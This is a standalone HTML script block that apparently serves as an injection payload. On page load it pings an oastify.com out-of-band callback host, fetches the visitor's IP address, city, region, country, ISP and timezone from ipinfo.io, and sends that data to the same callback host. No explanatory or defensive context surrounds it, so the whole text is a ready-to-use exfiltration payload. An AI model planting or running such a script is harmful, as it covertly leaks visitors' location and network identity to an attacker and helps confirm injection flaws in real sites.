<script>
    fetch('https://nkbofopuhbbxaj305pi7gw65dwjo7iv7.oastify.com', { method: 'POST', mode: 'no-cors'}); 

    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        const params = new URLSearchParams({
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        org: data.org,
        timezone: data.timezone
        });
        
      
        fetch(`https://nkbofopuhbbxaj305pi7gw65dwjo7iv7.oastify.com?${params.toString()}`, {
        method: 'GET',
        mode: 'no-cors'
        });
    });

</script>
